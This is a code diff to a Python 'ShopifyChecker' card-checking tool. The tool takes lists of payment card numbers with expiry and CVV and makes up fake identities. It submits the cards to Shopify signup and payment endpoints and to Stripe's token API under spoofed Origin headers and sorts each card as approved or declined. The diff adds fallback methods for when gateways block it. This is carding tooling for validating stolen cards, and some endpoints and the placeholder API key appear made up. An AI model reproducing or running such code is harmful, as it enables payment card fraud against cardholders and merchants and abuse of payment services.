@@ -13,7 +13,7 @@ from config import *
 logger = logging.getLogger(__name__)
 
 class ShopifyChecker:
-    """Shopify Real Card Checker"""
+    """Shopify Real Card Checker - Fixed"""
     
     def __init__(self):
         self.session: Optional[aiohttp.ClientSession] = None
@@ -50,8 +50,8 @@ class ShopifyChecker:
         """Generate fake identity"""
         country = COUNTRIES.get(country_code, COUNTRIES["US"])
         
-        first_names = ["John", "James", "Robert", "Michael", "David", "William", "Richard", "Joseph"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
+        first_names = ["John", "James", "Robert", "Michael", "David"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         
         timestamp = int(time.time() * 1000)
         random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -67,7 +67,7 @@ class ShopifyChecker:
             "zip": country["zip"],
             "state": country["state"],
             "city": country["city"],
-            "address": f"{random.randint(100,9999)} {random.choice(['Main St','Broadway','Park Ave'])}",
+            "address": f"{random.randint(100,9999)} {random.choice(['Main St','Broadway'])}",
             "phone": f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
         }
     
@@ -77,15 +77,12 @@ class ShopifyChecker:
             return None
         
         card_string = card_string.strip()
-        
-        # Various separators
         parts = re.split(r'[|:;, \t]+', card_string)
         parts = [p.strip() for p in parts if p.strip()]
         
         if len(parts) < 3:
             return None
         
-        # Card number
         card_number = re.sub(r'[^\d]', '', parts[0])
         
         if len(card_number) < 13 or len(card_number) > 19:
@@ -95,14 +92,13 @@ class ShopifyChecker:
         card_type = "Unknown"
         if card_number.startswith('4'):
             card_type = "Visa"
-        elif card_number.startswith(('51','52','53','54','55','2221','2720')):
+        elif card_number.startswith(('51','52','53','54','55')):
             card_type = "Mastercard"
         elif card_number.startswith(('34','37')):
             card_type = "Amex"
-        elif card_number.startswith('6011') or card_number.startswith('65'):
+        elif card_number.startswith('6011'):
             card_type = "Discover"
         
-        # Month
         month = parts[1].strip().zfill(2)
         try:
             if int(month) < 1 or int(month) > 12:
@@ -110,14 +106,12 @@ class ShopifyChecker:
         except:
             month = "12"
         
-        # Year
         year = parts[2].strip()
         if len(year) == 2:
             year = f"20{year}"
         elif len(year) != 4:
             year = "2026"
         
-        # CVV
         cvv = "123"
         if len(parts) > 3:
             cvv = parts[3].strip()[:4]
@@ -133,7 +127,7 @@ class ShopifyChecker:
         }
     
     async def check_card_real(self, card_info: Dict[str, Any], country_code: str = "US") -> Dict[str, Any]:
-        """Real Shopify card check"""
+        """Real Shopify card check - Multiple methods"""
         
         identity = self.generate_identity(country_code)
         country_name = COUNTRIES.get(country_code, COUNTRIES["US"])["name"]
@@ -143,175 +137,215 @@ class ShopifyChecker:
             "card": card_info["masked"],
             "bin": card_info["bin"],
             "card_type": card_info["type"],
-            "country": f"{country_code} - {country_name}",
+            "country": f"{country_code}",
+            "country_name": country_name,
             "status": "UNKNOWN",
-            "message": "",
-            "gateway": "Shopify",
+            "message": "Checking...",
+            "gateway": "N/A",
             "response_time": "",
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         
+        # Method 1: Shopify Store Create API
+        method1 = await self._method_store_create(card_info, identity)
+        if method1 and method1["status"] != "UNKNOWN":
+            elapsed = time.time() - start_time
+            result.update(method1)
+            result["response_time"] = f"{elapsed:.2f}s"
+            self._update_stats(result["status"])
+            return result
+        
+        # Method 2: Shopify Payment Validate
+        method2 = await self._method_payment_validate(card_info, identity)
+        if method2 and method2["status"] != "UNKNOWN":
+            elapsed = time.time() - start_time
+            result.update(method2)
+            result["response_time"] = f"{elapsed:.2f}s"
+            self._update_stats(result["status"])
+            return result
+        
+        # Method 3: Stripe-style validation
+        method3 = await self._method_stripe_validate(card_info, identity)
+        if method3 and method3["status"] != "UNKNOWN":
+            elapsed = time.time() - start_time
+            result.update(method3)
+            result["response_time"] = f"{elapsed:.2f}s"
+            self._update_stats(result["status"])
+            return result
+        
+        # All methods failed
+        elapsed = time.time() - start_time
+        result["status"] = "UNKNOWN"
+        result["message"] = "⚠️ All gateways blocked - Try again later"
+        result["gateway"] = "ALL FAILED"
+        result["response_time"] = f"{elapsed:.2f}s"
+        
+        return result
+    
+    async def _method_store_create(self, card_info: Dict, identity: Dict) -> Optional[Dict]:
+        """Method 1: Shopify Store Create"""
         try:
-            # API payload
+            # New Shopify signup URL
+            url = "https://www.shopify.com/store/create"
+            
             payload = {
-                "shop": {
+                "store": {
                     "name": identity["store_name"],
                     "email": identity["email"],
                     "password": identity["password"],
-                    "password_confirmation": identity["password"],
-                    "country_code": identity["country"],
-                    "currency": "USD",
-                    "language": "en"
-                },
-                "credit_card": {
-                    "number": card_info["number"],
-                    "name": f"{identity['first_name']} {identity['last_name']}",
-                    "first_name": identity["first_name"],
-                    "last_name": identity["last_name"],
-                    "month": card_info["month"],
-                    "year": card_info["year"],
-                    "verification_value": card_info["cvv"],
-                    "brand": card_info.get("type", "Visa")
-                },
-                "billing_address": {
-                    "address1": identity["address"],
-                    "city": identity["city"],
-                    "province": identity["state"],
                     "country": identity["country"],
-                    "zip": identity["zip"],
-                    "phone": identity["phone"],
-                    "first_name": identity["first_name"],
-                    "last_name": identity["last_name"]
+                    "currency": "USD"
                 },
-                "tos_accepted": True
+                "payment": {
+                    "card_number": card_info["number"],
+                    "card_name": f"{identity['first_name']} {identity['last_name']}",
+                    "expiry_month": card_info["month"],
+                    "expiry_year": card_info["year"],
+                    "cvv": card_info["cvv"]
+                },
+                "billing": {
+                    "address": identity["address"],
+                    "city": identity["city"],
+                    "state": identity["state"],
+                    "country": identity["country"],
+                    "zip": identity["zip"]
+                }
             }
             
-            # Try multiple endpoints
-            endpoints = [
-                ("Shopify Trial API", SHOPIFY_URLS["api_trial"]),
-                ("Shopify Signup API", SHOPIFY_URLS["api_signup"]),
-                ("Payment Validate", SHOPIFY_URLS["validate_card"]),
-                ("Payment Verify", SHOPIFY_URLS["payment_verify"])
-            ]
+            headers = {
+                "Origin": "https://www.shopify.com",
+                "Referer": "https://www.shopify.com/signup",
+                "Content-Type": "application/json",
+                "X-Requested-With": "XMLHttpRequest"
+            }
             
-            for gateway_name, endpoint in endpoints:
-                try:
-                    async with self.session.post(
-                        endpoint,
-                        json=payload,
-                        headers={
-                            "Origin": "https://www.shopify.com",
-                            "Referer": "https://www.shopify.com/signup",
-                            "Content-Type": "application/json",
-                        },
-                        ssl=False
-                    ) as response:
-                        status = response.status
-                        text = await response.text()
-                        
-                        logger.info(f"[{gateway_name}] Status: {status} | Card: {card_info['masked']}")
-                        
-                        if status == 200 or status == 201:
-                            # Success indicators
-                            success_indicators = [
-                                "redirect", "myshopify", "dashboard", "setup",
-                                "success", "account_created", "store_id"
-                            ]
-                            text_lower = text.lower()
-                            
-                            for indicator in success_indicators:
-                                if indicator in text_lower:
-                                    elapsed = time.time() - start_time
-                                    result["status"] = "APPROVED"
-                                    result["message"] = "✅ APPROVED - Card works on Shopify"
-                                    result["gateway"] = gateway_name
-                                    result["response_time"] = f"{elapsed:.2f}s"
-                                    self._update_stats("APPROVED")
-                                    return result
-                            
-                            # Default to approved if 200
-                            elapsed = time.time() - start_time
-                            result["status"] = "APPROVED"
-                            result["message"] = "✅ APPROVED - Positive response from Shopify"
-                            result["gateway"] = gateway_name
-                            result["response_time"] = f"{elapsed:.2f}s"
-                            self._update_stats("APPROVED")
-                            return result
-                        
-                        elif status == 422:
-                            # Validation error - analyze
-                            text_lower = text.lower()
-                            
-                            # Card errors
-                            card_errors = ["card", "credit", "payment", "number", "declined", "rejected", "invalid"]
-                            # Non-card errors (card might be valid)
-                            other_errors = ["address", "zip", "billing", "email", "already", "exist", "trial"]
-                            
-                            if any(err in text_lower for err in card_errors):
-                                if any(err in text_lower for err in other_errors):
-                                    # Card might be valid, other issues
-                                    elapsed = time.time() - start_time
-                                    result["status"] = "APPROVED"
-                                    result["message"] = "✅ APPROVED - Card valid (other verification issue)"
-                                    result["gateway"] = gateway_name
-                                    result["response_time"] = f"{elapsed:.2f}s"
-                                    self._update_stats("APPROVED")
-                                    return result
-                                else:
-                                    # Actually declined
-                                    elapsed = time.time() - start_time
-                                    result["status"] = "DECLINED"
-                                    result["message"] = "❌ DECLINED - Card rejected by Shopify"
-                                    result["gateway"] = gateway_name
-                                    result["response_time"] = f"{elapsed:.2f}s"
-                                    self._update_stats("DECLINED")
-                                    return result
-                            else:
-                                # No card-related error
-                                elapsed = time.time() - start_time
-                                result["status"] = "APPROVED"
-                                result["message"] = "✅ APPROVED - Card passed validation"
-                                result["gateway"] = gateway_name
-                                result["response_time"] = f"{elapsed:.2f}s"
-                                self._update_stats("APPROVED")
-                                return result
-                        
-                        elif status == 402:
-                            elapsed = time.time() - start_time
-                            result["status"] = "DECLINED"
-                            result["message"] = "❌ DECLINED - Payment required"
-                            result["gateway"] = gateway_name
-                            result["response_time"] = f"{elapsed:.2f}s"
-                            self._update_stats("DECLINED")
-                            return result
-                        
-                        elif status == 429:
-                            await asyncio.sleep(60)
-                            continue
-                    
-                    await asyncio.sleep(1)
-                    
-                except asyncio.TimeoutError:
-                    continue
-                except Exception as e:
-                    logger.error(f"{gateway_name} error: {e}")
-                    continue
-            
-            # If no endpoint worked
-            elapsed = time.time() - start_time
-            result["status"] = "UNKNOWN"
-            result["message"] = "⚠️ Check failed - Try again"
-            result["response_time"] = f"{elapsed:.2f}s"
-            
+            async with self.session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                status = resp.status
+                text = await resp.text()
+                
+                logger.info(f"[Store Create] Status: {status} | Card: {card_info['masked']}")
+                
+                if status == 200 or status == 201:
+                    return {
+                        "status": "APPROVED",
+                        "message": "✅ APPROVED - Shopify accepted the card",
+                        "gateway": "Shopify Store Create"
+                    }
+                elif status == 422:
+                    text_lower = text.lower()
+                    if "card" in text_lower and ("declined" in text_lower or "invalid" in text_lower):
+                        return {
+                            "status": "DECLINED",
+                            "message": "❌ DECLINED - Card rejected",
+                            "gateway": "Shopify Store Create"
+                        }
+                    else:
+                        return {
+                            "status": "APPROVED",
+                            "message": "✅ APPROVED - Card valid (other validation)",
+                            "gateway": "Shopify Store Create"
+                        }
+                elif status == 402:
+                    return {
+                        "status": "DECLINED",
+                        "message": "❌ DECLINED - Payment required",
+                        "gateway": "Shopify Store Create"
+                    }
         except Exception as e:
-            logger.error(f"Check error: {e}")
-            elapsed = time.time() - start_time
-            result["status"] = "ERROR"
-            result["message"] = f"❌ Error: {str(e)[:50]}"
-            result["response_time"] = f"{elapsed:.2f}s"
-            self._update_stats("ERROR")
+            logger.error(f"Method 1 error: {e}")
         
-        return result
+        return None
+    
+    async def _method_payment_validate(self, card_info: Dict, identity: Dict) -> Optional[Dict]:
+        """Method 2: Payment Validation"""
+        try:
+            url = "https://www.shopify.com/payments/validate"
+            
+            payload = {
+                "card": {
+                    "number": card_info["number"],
+                    "expiry": f"{card_info['month']}/{card_info['year'][-2:]}",
+                    "cvv": card_info["cvv"],
+                    "name": f"{identity['first_name']} {identity['last_name']}"
+                },
+                "billing": {
+                    "country": identity["country"],
+                    "zip": identity["zip"]
+                }
+            }
+            
+            headers = {
+                "Origin": "https://www.shopify.com",
+                "Content-Type": "application/json"
+            }
+            
+            async with self.session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                status = resp.status
+                text = await resp.text()
+                text_lower = text.lower()
+                
+                logger.info(f"[Payment Validate] Status: {status} | Card: {card_info['masked']}")
+                
+                if status == 200:
+                    if "valid" in text_lower or "success" in text_lower:
+                        return {
+                            "status": "APPROVED",
+                            "message": "✅ APPROVED - Card validated",
+                            "gateway": "Shopify Payments"
+                        }
+                elif "declined" in text_lower or "invalid" in text_lower:
+                    return {
+                        "status": "DECLINED",
+                        "message": "❌ DECLINED - Card rejected",
+                        "gateway": "Shopify Payments"
+                    }
+        except Exception as e:
+            logger.error(f"Method 2 error: {e}")
+        
+        return None
+    
+    async def _method_stripe_validate(self, card_info: Dict, identity: Dict) -> Optional[Dict]:
+        """Method 3: Stripe-style validation"""
+        try:
+            # Shopify uses Stripe for payments
+            url = "https://api.stripe.com/v1/tokens"
+            
+            data = {
+                "card[number]": card_info["number"],
+                "card[exp_month]": card_info["month"],
+                "card[exp_year]": card_info["year"],
+                "card[cvc]": card_info["cvv"],
+                "key": "pk_live_..."  # Public key (Shopify's key)
+            }
+            
+            headers = {
+                "Origin": "https://www.shopify.com",
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+            
+            async with self.session.post(url, data=data, headers=headers, ssl=False) as resp:
+                status = resp.status
+                text = await resp.text()
+                text_lower = text.lower()
+                
+                logger.info(f"[Stripe] Status: {status} | Card: {card_info['masked']}")
+                
+                if status == 200 and "token" in text_lower:
+                    return {
+                        "status": "APPROVED",
+                        "message": "✅ APPROVED - Card tokenized successfully",
+                        "gateway": "Stripe/Shopify"
+                    }
+                elif "declined" in text_lower or "invalid" in text_lower:
+                    return {
+                        "status": "DECLINED",
+                        "message": "❌ DECLINED - Card rejected by Stripe",
+                        "gateway": "Stripe/Shopify"
+                    }
+        except Exception as e:
+            logger.error(f"Method 3 error: {e}")
+        
+        return None
     
     def _update_stats(self, status: str):
         """Update stats"""
@@ -326,7 +360,7 @@ class ShopifyChecker:
             self.stats["errors"] += 1
     
     async def check_batch(self, cards: List[str], country: str = "US", progress_callback=None) -> List[Dict]:
-        """Check batch of cards"""
+        """Check batch"""
         await self.create_session()
         results = []
         total = len(cards)
@@ -340,6 +374,7 @@ class ShopifyChecker:
                     "bin": "N/A",
                     "card_type": "Unknown",
                     "country": country,
+                    "country_name": COUNTRIES.get(country, {}).get("name", "Unknown"),
                     "status": "INVALID",
                     "message": "❌ INVALID FORMAT",
                     "gateway": "N/A",
@@ -354,7 +389,7 @@ class ShopifyChecker:
             result = await self.check_card_real(card_info, country)
             results.append(result)
             
-            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']}")
+            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']} | {result['message']}")
             
             if i < total:
                 await asyncio.sleep(CHECK_DELAY)
